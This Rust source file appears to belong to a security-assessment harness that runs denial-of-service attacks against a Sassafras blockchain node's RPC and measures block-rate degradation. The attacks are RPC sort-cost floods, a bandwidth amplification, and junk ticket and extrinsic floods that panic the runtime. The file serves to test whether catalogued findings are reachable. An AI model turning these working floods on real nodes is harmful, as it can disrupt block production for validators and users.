// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2026 Rostro Foundation contributors

//! Concrete attack subcommands.
//!
//! Each function here corresponds to one CLI subcommand and exercises one
//! or more findings from the threat-landscape catalog. The structure is:
//!
//!   1. Connect.
//!   2. Take a baseline observation window.
//!   3. Run the attack (with a concurrent observation window).
//!   4. Take a post-attack observation window so recovery is visible.
//!   5. Print a per-phase summary.
//!
//! We don't try to be exhaustive here — we want evidence of reachability.
//! Either the metric moves (the finding is reachable) or it doesn't (the
//! finding is theoretical against this binary).

use anyhow::Result;
use codec::Encode;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;

use crate::{client, metrics};

/// Sanity check: connect, print chain name + head + peers.
pub async fn chain_info(ws: &str) -> Result<()> {
	let c = client::connect(ws).await?;
	let chain = client::system_chain(&c).await?;
	let head = client::chain_get_header(&c).await?;
	let health = client::system_health(&c).await?;
	println!("chain        : {chain}");
	println!("best #       : {} ({})", head.number_decimal(), head.number);
	println!("parent       : {}", head.parent_hash);
	println!("state_root   : {}", head.state_root);
	println!("peers        : {}", health.peers);
	println!("is_syncing   : {}", health.is_syncing);
	Ok(())
}

/// Wrapper: run a single observation window and print stats.
pub async fn monitor(ws: &str, duration_secs: u64) -> Result<()> {
	let c = client::connect(ws).await?;
	let stats = metrics::observe_window(
		&c,
		Duration::from_secs(duration_secs),
		Duration::from_secs(2),
	).await?;
	println!("[monitor] {stats}");
	Ok(())
}

/// F-6: free-RPC sort_segments DoS.
///
/// The runtime API `SassafrasApi::slot_ticket(slot)` is exposed by every
/// node via `state_call`. When invoked, the runtime calls
/// `Pallet::slot_ticket → consume_tickets_segments → sort_segments(u32::MAX, ...)`,
/// which is unbounded work proportional to the number of unsorted ticket
/// segments. This is the documented free-CPU vector — no signature, no
/// fee, no extrinsic.
///
/// We spawn `concurrency` tokio tasks. Each loops over slot ids in
/// `[0, slot_range)` and calls `state_call SassafrasApi_slot_ticket(slot)`
/// as fast as the node will accept. We measure block-production rate
/// before, during, and after.
pub async fn attack_rpc_sort(
	ws: &str,
	concurrency: usize,
	duration_secs: u64,
	slot_range: u64,
) -> Result<()> {
	println!(
		"[F-6] target={ws} concurrency={concurrency} duration={duration_secs}s \
		 slot_range=0..{slot_range}"
	);

	// Baseline.
	let observer = client::connect(ws).await?;
	println!("[F-6] baseline window ({}s)…", 15);
	let baseline = metrics::observe_window(
		&observer,
		Duration::from_secs(15),
		Duration::from_secs(2),
	).await?;
	println!("[F-6] baseline   : {baseline}");

	// Attack.
	let calls = Arc::new(AtomicU64::new(0));
	let errors = Arc::new(AtomicU64::new(0));
	let stop = Arc::new(AtomicU64::new(0));

	let mut handles = Vec::with_capacity(concurrency);
	for worker_id in 0..concurrency {
		let ws = ws.to_string();
		let calls = calls.clone();
		let errors = errors.clone();
		let stop = stop.clone();
		handles.push(tokio::spawn(async move {
			let c = match client::connect(&ws).await {
				Ok(c) => c,
				Err(e) => {
					eprintln!("[F-6 worker {worker_id}] connect failed: {e}");
					return;
				}
			};
			let mut slot: u64 = (worker_id as u64).wrapping_mul(1_000);
			while stop.load(Ordering::Relaxed) == 0 {
				let slot_id = slot % slot_range;
				let params_hex = format!("0x{}", hex::encode(slot_id.encode()));
				match client::state_call(&c, "SassafrasApi_slot_ticket", &params_hex).await {
					Ok(_) => { calls.fetch_add(1, Ordering::Relaxed); }
					Err(_) => { errors.fetch_add(1, Ordering::Relaxed); }
				}
				slot = slot.wrapping_add(1);
			}
		}));
	}

	println!("[F-6] attack window ({duration_secs}s)…");
	let during = metrics::observe_window(
		&observer,
		Duration::from_secs(duration_secs),
		Duration::from_secs(2),
	).await?;
	stop.store(1, Ordering::Relaxed);

	for h in handles {
		let _ = h.await;
	}
	let total_calls = calls.load(Ordering::Relaxed);
	let total_errors = errors.load(Ordering::Relaxed);

	println!("[F-6] during     : {during}");
	println!("[F-6] rpc calls  : {total_calls} ok, {total_errors} err");

	// Recovery.
	println!("[F-6] recovery window ({}s)…", 15);
	let after = metrics::observe_window(
		&observer,
		Duration::from_secs(15),
		Duration::from_secs(2),
	).await?;
	println!("[F-6] after      : {after}");

	// Verdict.
	let baseline_bpm = baseline.blocks_per_minute;
	let during_bpm = during.blocks_per_minute;
	let drop_pct = if baseline_bpm > 0.0 {
		((baseline_bpm - during_bpm) / baseline_bpm) * 100.0
	} else {
		0.0
	};
	println!(
		"[F-6] verdict    : block-rate change = {drop_pct:+.1}% \
		 ({:.1} → {:.1} blocks/min)",
		baseline_bpm, during_bpm
	);
	if drop_pct >= 25.0 {
		println!("[F-6] REACHABLE  : sustained block-rate degradation observed");
	} else if drop_pct >= 10.0 {
		println!("[F-6] PARTIAL    : measurable but not catastrophic degradation");
	} else {
		println!("[F-6] NOT-REACHED: no significant block-rate degradation");
	}
	Ok(())
}

/// Verify `chain_subscribeNewHeads` works through the shield. A real
/// wallet uses this pattern: open a WS connection, subscribe to new
/// heads, receive push notifications. The shield charges one token at
/// subscribe time but no further tokens for inbound notifications
/// (notifications are server→client, the middleware fires on client→
/// server).
pub async fn subscribe_test(ws: &str, timeout_secs: u64) -> Result<()> {
	use jsonrpsee::core::client::{ClientT, Subscription, SubscriptionClientT};
	use jsonrpsee::rpc_params;

	println!("[subscribe-test] target={ws} timeout={timeout_secs}s");
	let c = client::connect(ws).await?;

	// Sanity: a regular call works.
	let _: serde_json::Value = c
		.request("chain_getHeader", rpc_params![])
		.await
		.map_err(|e| anyhow::anyhow!("chain_getHeader failed: {e}"))?;
	println!("[subscribe-test] chain_getHeader OK");

	// Subscribe to new heads. jsonrpsee's substrate convention:
	// subscribe method = "chain_subscribeNewHeads", unsubscribe = "chain_unsubscribeNewHeads",
	// notification = "chain_newHead".
	let mut sub: Subscription<serde_json::Value> = c
		.subscribe(
			"chain_subscribeNewHeads",
			rpc_params![],
			"chain_unsubscribeNewHeads",
		)
		.await
		.map_err(|e| anyhow::anyhow!("subscribe failed: {e}"))?;
	println!("[subscribe-test] subscription opened");

	let deadline = tokio::time::Instant::now() + Duration::from_secs(timeout_secs);
	let mut got = 0;
	while got < 2 {
		let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
		if remaining.is_zero() {
			anyhow::bail!("timed out waiting for head notifications (got {got}/2)");
		}
		match tokio::time::timeout(remaining, sub.next()).await {
			Ok(Some(Ok(_head))) => {
				got += 1;
				println!("[subscribe-test] received head notification #{got}");
			}
			Ok(Some(Err(e))) => anyhow::bail!("subscription error: {e}"),
			Ok(None) => anyhow::bail!("subscription closed by server before 2 heads"),
			Err(_) => anyhow::bail!("timed out waiting for next head"),
		}
	}
	println!("[subscribe-test] PASS: {got} head notifications received over the shield");
	Ok(())
}

/// F-NEW-2: bandwidth amplification via `SassafrasApi_ring_context`.
///
/// Each call returns ~580KB (the KZG SRS). The server cost is one
/// storage read; the network cost is ~580KB outbound per call. Sizes
/// how much outbound bandwidth an attacker can pump from one validator
/// with a small upload budget.
pub async fn attack_bandwidth_amp(
	ws: &str,
	concurrency: usize,
	duration_secs: u64,
) -> Result<()> {
	println!(
		"[F-NEW-2] target={ws} concurrency={concurrency} duration={duration_secs}s"
	);

	let observer = client::connect(ws).await?;
	println!("[F-NEW-2] baseline window (15s)…");
	let baseline = metrics::observe_window(
		&observer,
		Duration::from_secs(15),
		Duration::from_secs(2),
	).await?;
	println!("[F-NEW-2] baseline   : {baseline}");

	let calls = Arc::new(AtomicU64::new(0));
	let bytes_in = Arc::new(AtomicU64::new(0));
	let errors = Arc::new(AtomicU64::new(0));
	let stop = Arc::new(AtomicU64::new(0));

	let mut handles = Vec::with_capacity(concurrency);
	for worker_id in 0..concurrency {
		let ws = ws.to_string();
		let calls = calls.clone();
		let bytes_in = bytes_in.clone();
		let errors = errors.clone();
		let stop = stop.clone();
		handles.push(tokio::spawn(async move {
			let c = match client::connect(&ws).await {
				Ok(c) => c,
				Err(e) => {
					eprintln!("[F-NEW-2 worker {worker_id}] connect failed: {e}");
					return;
				}
			};
			while stop.load(Ordering::Relaxed) == 0 {
				match client::state_call(&c, "SassafrasApi_ring_context", "").await {
					Ok(s) => {
						calls.fetch_add(1, Ordering::Relaxed);
						bytes_in.fetch_add(s.len() as u64, Ordering::Relaxed);
					}
					Err(_) => { errors.fetch_add(1, Ordering::Relaxed); }
				}
			}
		}));
	}

	println!("[F-NEW-2] attack window ({duration_secs}s)…");
	let during = metrics::observe_window(
		&observer,
		Duration::from_secs(duration_secs),
		Duration::from_secs(2),
	).await?;
	stop.store(1, Ordering::Relaxed);
	for h in handles { let _ = h.await; }

	let total_calls = calls.load(Ordering::Relaxed);
	let total_bytes = bytes_in.load(Ordering::Relaxed);
	let total_errors = errors.load(Ordering::Relaxed);
	let mb_per_sec = (total_bytes as f64) / (duration_secs as f64) / 1_000_000.0;

	println!("[F-NEW-2] during     : {during}");
	println!(
		"[F-NEW-2] api calls   : {total_calls} ok, {total_errors} err"
	);
	println!(
		"[F-NEW-2] bandwidth  : {} bytes pulled in {duration_secs}s = {:.1} MB/s",
		total_bytes, mb_per_sec
	);

	println!("[F-NEW-2] recovery window (15s)…");
	let after = metrics::observe_window(
		&observer,
		Duration::from_secs(15),
		Duration::from_secs(2),
	).await?;
	println!("[F-NEW-2] after      : {after}");

	let baseline_bpm = baseline.blocks_per_minute;
	let during_bpm = during.blocks_per_minute;
	let drop_pct = if baseline_bpm > 0.0 {
		((baseline_bpm - during_bpm) / baseline_bpm) * 100.0
	} else { 0.0 };
	println!(
		"[F-NEW-2] verdict     : block-rate change = {drop_pct:+.1}% \
		 ({:.1} → {:.1} blocks/min), outbound {:.1} MB/s",
		baseline_bpm, during_bpm, mb_per_sec
	);
	Ok(())
}

/// F-7: flood `SassafrasApi_submit_tickets_unsigned_extrinsic` runtime
/// API. `mode` selects the payload shape:
///
///   - "empty"   → SCALE encoding of empty `Vec<TicketEnvelope>` (0x00).
///                 Cheap-but-real entry cost into the API. Confirms the
///                 path works and measures its baseline overhead.
///   - "garbage" → length-prefix that claims one envelope, followed by
///                 random bytes. Decode will likely fail at the
///                 `VrfPreOutput` curve-point validation. Confirms
///                 whether this API panics on garbage the same way
///                 `TaggedTransactionQueue` does.
pub async fn attack_tickets_api(
	ws: &str,
	concurrency: usize,
	duration_secs: u64,
	mode: &str,
) -> Result<()> {
	println!(
		"[F-7] target={ws} concurrency={concurrency} duration={duration_secs}s mode={mode}"
	);
	let observer = client::connect(ws).await?;
	println!("[F-7] baseline window (15s)…");
	let baseline = metrics::observe_window(
		&observer,
		Duration::from_secs(15),
		Duration::from_secs(2),
	).await?;
	println!("[F-7] baseline   : {baseline}");

	let calls = Arc::new(AtomicU64::new(0));
	let panics = Arc::new(AtomicU64::new(0));
	let other_err = Arc::new(AtomicU64::new(0));
	let stop = Arc::new(AtomicU64::new(0));

	// Pre-build the payload once.
	let payload_hex: String = match mode {
		"empty" => "0x00".to_string(),
		"garbage" => {
			// SCALE compact length 1 (one envelope) + 852 bytes of junk.
			let mut buf = vec![0x04u8]; // compact-length for 1
			let mut envelope = vec![0u8; 852];
			for (i, b) in envelope.iter_mut().enumerate() {
				*b = (i as u8).wrapping_mul(31).wrapping_add(7);
			}
			buf.extend_from_slice(&envelope);
			format!("0x{}", hex::encode(&buf))
		}
		other => {
			println!("[F-7] unknown mode '{other}', expected 'empty' or 'garbage'");
			return Ok(());
		}
	};
	println!("[F-7] payload size: {} hex chars", payload_hex.len());

	let mut handles = Vec::with_capacity(concurrency);
	for worker_id in 0..concurrency {
		let ws = ws.to_string();
		let payload_hex = payload_hex.clone();
		let calls = calls.clone();
		let panics = panics.clone();
		let other_err = other_err.clone();
		let stop = stop.clone();
		handles.push(tokio::spawn(async move {
			let c = match client::connect(&ws).await {
				Ok(c) => c,
				Err(e) => {
					eprintln!("[F-7 worker {worker_id}] connect failed: {e}");
					return;
				}
			};
			while stop.load(Ordering::Relaxed) == 0 {
				match client::state_call(
					&c,
					"SassafrasApi_submit_tickets_unsigned_extrinsic",
					&payload_hex,
				).await {
					Ok(_) => { calls.fetch_add(1, Ordering::Relaxed); }
					Err(e) => {
						let msg = format!("{e}");
						if msg.contains("unreachable")
						|| msg.contains("Verification Error")
						|| msg.contains("host code panicked")
						|| msg.contains("Execution aborted")
					{
							panics.fetch_add(1, Ordering::Relaxed);
						} else {
							other_err.fetch_add(1, Ordering::Relaxed);
						}
					}
				}
			}
		}));
	}

	println!("[F-7] attack window ({duration_secs}s)…");
	let during = metrics::observe_window(
		&observer,
		Duration::from_secs(duration_secs),
		Duration::from_secs(2),
	).await?;
	stop.store(1, Ordering::Relaxed);
	for h in handles { let _ = h.await; }

	println!("[F-7] during     : {during}");
	println!(
		"[F-7] api calls   : {} ok, {} runtime-panics, {} other-err",
		calls.load(Ordering::Relaxed),
		panics.load(Ordering::Relaxed),
		other_err.load(Ordering::Relaxed),
	);

	println!("[F-7] recovery window (15s)…");
	let after = metrics::observe_window(
		&observer,
		Duration::from_secs(15),
		Duration::from_secs(2),
	).await?;
	println!("[F-7] after      : {after}");

	let baseline_bpm = baseline.blocks_per_minute;
	let during_bpm = during.blocks_per_minute;
	let drop_pct = if baseline_bpm > 0.0 {
		((baseline_bpm - during_bpm) / baseline_bpm) * 100.0
	} else { 0.0 };
	println!(
		"[F-7] verdict     : block-rate change = {drop_pct:+.1}% \
		 ({:.1} → {:.1} blocks/min)",
		baseline_bpm, during_bpm
	);
	Ok(())
}

/// F-25-sub: flood `author_submitExtrinsic` with junk to size the
/// `TaggedTransactionQueue::validate_transaction` panic-on-junk DoS.
///
/// First-pass F-25 confirmed that malformed bytes don't return
/// `InvalidTransaction` — they panic the runtime via a `unreachable`
/// trap inside `validate_transaction`. Each call spends CPU on the WASM
/// runtime API even though the input is garbage. This sizes how much
/// damage that costs at sustained concurrency.
pub async fn flood_junk_extrinsics(
	ws: &str,
	concurrency: usize,
	duration_secs: u64,
	junk_bytes: usize,
) -> Result<()> {
	println!(
		"[F-25-sub] target={ws} concurrency={concurrency} duration={duration_secs}s \
		 junk_bytes={junk_bytes}"
	);

	let observer = client::connect(ws).await?;
	println!("[F-25-sub] baseline window (15s)…");
	let baseline = metrics::observe_window(
		&observer,
		Duration::from_secs(15),
		Duration::from_secs(2),
	).await?;
	println!("[F-25-sub] baseline   : {baseline}");

	let calls = Arc::new(AtomicU64::new(0));
	let panics = Arc::new(AtomicU64::new(0));
	let other_err = Arc::new(AtomicU64::new(0));
	let stop = Arc::new(AtomicU64::new(0));

	let mut handles = Vec::with_capacity(concurrency);
	for worker_id in 0..concurrency {
		let ws = ws.to_string();
		let calls = calls.clone();
		let panics = panics.clone();
		let other_err = other_err.clone();
		let stop = stop.clone();
		handles.push(tokio::spawn(async move {
			let c = match client::connect(&ws).await {
				Ok(c) => c,
				Err(e) => {
					eprintln!("[F-25-sub worker {worker_id}] connect failed: {e}");
					return;
				}
			};
			// Per-worker pseudo-random byte stream (lcg, deterministic, good enough).
			let mut state: u64 = 0x9E37_79B9_7F4A_7C15u64
				.wrapping_mul(worker_id as u64 + 1);
			let mut buf = vec![0u8; junk_bytes];
			while stop.load(Ordering::Relaxed) == 0 {
				for b in buf.iter_mut() {
					state = state.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
					*b = (state >> 33) as u8;
				}
				let hex = format!("0x{}", hex::encode(&buf));
				match client::author_submit_extrinsic(&c, &hex).await {
					Ok(_) => { calls.fetch_add(1, Ordering::Relaxed); }
					Err(e) => {
						let msg = format!("{e}");
						if msg.contains("unreachable")
						|| msg.contains("Verification Error")
						|| msg.contains("host code panicked")
						|| msg.contains("Execution aborted")
					{
							panics.fetch_add(1, Ordering::Relaxed);
						} else {
							other_err.fetch_add(1, Ordering::Relaxed);
						}
					}
				}
			}
		}));
	}

	println!("[F-25-sub] attack window ({duration_secs}s)…");
	let during = metrics::observe_window(
		&observer,
		Duration::from_secs(duration_secs),
		Duration::from_secs(2),
	).await?;
	stop.store(1, Ordering::Relaxed);
	for h in handles { let _ = h.await; }

	println!("[F-25-sub] during     : {during}");
	println!(
		"[F-25-sub] submits   : {} accepted, {} runtime-panics, {} other-err",
		calls.load(Ordering::Relaxed),
		panics.load(Ordering::Relaxed),
		other_err.load(Ordering::Relaxed),
	);

	println!("[F-25-sub] recovery window (15s)…");
	let after = metrics::observe_window(
		&observer,
		Duration::from_secs(15),
		Duration::from_secs(2),
	).await?;
	println!("[F-25-sub] after      : {after}");

	let baseline_bpm = baseline.blocks_per_minute;
	let during_bpm = during.blocks_per_minute;
	let drop_pct = if baseline_bpm > 0.0 {
		((baseline_bpm - during_bpm) / baseline_bpm) * 100.0
	} else { 0.0 };
	println!(
		"[F-25-sub] verdict    : block-rate change = {drop_pct:+.1}% \
		 ({:.1} → {:.1} blocks/min)",
		baseline_bpm, during_bpm
	);
	if drop_pct >= 25.0 {
		println!("[F-25-sub] REACHABLE  : sustained block-rate degradation observed");
	} else if drop_pct >= 10.0 {
		println!("[F-25-sub] PARTIAL    : measurable but not catastrophic degradation");
	} else {
		println!("[F-25-sub] NOT-REACHED: no significant block-rate degradation");
	}
	Ok(())
}

/// F-25: external-source ticket submission rejection.
///
/// Sassafras's `submit_tickets_unsigned_extrinsic` is gated by
/// `validate_unsigned`, which (per the catalog) rejects sources other
/// than `InBlock`/`Local`. We submit a junk hex blob via
/// `author_submitExtrinsic` and assert that it is rejected. We expect
/// rejection — this test produces evidence that the gate works.
///
/// We don't bother constructing valid envelopes because the source check
/// fires before any verification. If the call somehow succeeds, that is
/// itself a finding — the gate is broken.
pub async fn attack_external_tickets(ws: &str, junk_bytes: usize) -> Result<()> {
	println!("[F-25] target={ws} junk_bytes={junk_bytes}");
	let c = client::connect(ws).await?;
	// Build a junk hex blob the size of a typical TicketEnvelope.
	let mut junk = vec![0u8; junk_bytes];
	for (i, b) in junk.iter_mut().enumerate() {
		*b = (i as u8).wrapping_mul(31);
	}
	let hex = format!("0x{}", hex::encode(&junk));
	let pending_before = client::author_pending_extrinsics(&c).await
		.map(|v| v.len()).unwrap_or(0);
	match client::author_submit_extrinsic(&c, &hex).await {
		Ok(h) => {
			println!("[F-25] UNEXPECTED: submit accepted, hash={h}");
			println!("[F-25] FINDING   : External-source unsigned ticket gate failed");
		}
		Err(e) => {
			println!("[F-25] expected rejection: {e}");
			println!("[F-25] gate works: external submit refused");
		}
	}
	let pending_after = client::author_pending_extrinsics(&c).await
		.map(|v| v.len()).unwrap_or(0);
	println!(
		"[F-25] mempool   : before={pending_before} after={pending_after}"
	);
	Ok(())
}
